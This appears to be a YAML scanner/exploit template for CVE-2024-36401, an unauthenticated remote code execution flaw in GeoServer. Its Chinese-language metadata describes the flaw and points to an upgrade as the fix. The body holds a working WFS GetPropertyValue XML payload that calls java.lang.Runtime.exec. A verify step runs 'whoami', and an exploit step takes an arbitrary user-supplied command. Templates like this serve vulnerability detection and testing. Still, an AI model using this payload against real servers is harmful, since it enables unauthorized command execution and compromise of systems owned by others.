app: geoserver
query: app:"geoserver"
meta:
  name: CVE-2024-36401-GeoServer远程代码执行漏洞
  level: 4
  tags:
  - remote_code_execution
  description: GeoServer多个受影响版本在默认安装中存在漏洞，由于不安全地将属性名称评估为XPath 表达式，未经身份验证的威胁者可通过发送恶意请求，利用多个OGC请求参数（如WFS
    GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和
    WPS Execute请求）导致远程代码执行。
  homepage: https://geoserver.org/
  author: X prism
  references: https://mp.weixin.qq.com/s/zaRu8qkqEYholqqnBPmADQ
  solution: 目前该漏洞已经修复，受影响用户可升级到最新版本。下载链接：https://github.com/geoserver/geoserver/tags
  create_at: "2024-07-18 11:41:08"
  available: true
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /geoserver/wfs
          redirect: true
          header:
          - Content-Type: application/xml
          params: |-
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
             xmlns:topp='http://www.openplans.org/topp'
             xmlns:fes='http://www.opengis.net/fes/2.0'
             xmlns:wfs='http://www.opengis.net/wfs/2.0'>
              <wfs:Query typeNames='topp:states'/>
              <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'whoami')</wfs:valueReference>
            </wfs:GetPropertyValue>
        response:
        - name: code
          value: "400"
          type: equals
        - name: body
          value: ClassCastException
          type: contains
    exploit_steps:
      type: and
      params:
        name: CMD
        type: input
        value: whoami
      exploit:
      - request:
          method: POST
          path: /geoserver/wfs
          redirect: true
          header:
          - Content-Type: application/xml
          params: |-
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
             xmlns:topp='http://www.openplans.org/topp'
             xmlns:fes='http://www.opengis.net/fes/2.0'
             xmlns:wfs='http://www.opengis.net/wfs/2.0'>
              <wfs:Query typeNames='sf:archsites'/>
              <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'{{exploit}}')</wfs:valueReference>
            </wfs:GetPropertyValue>
        response:
          - name: code
            value: "400"
            type: equals
          - name: body
            value: ClassCastException
            type: contains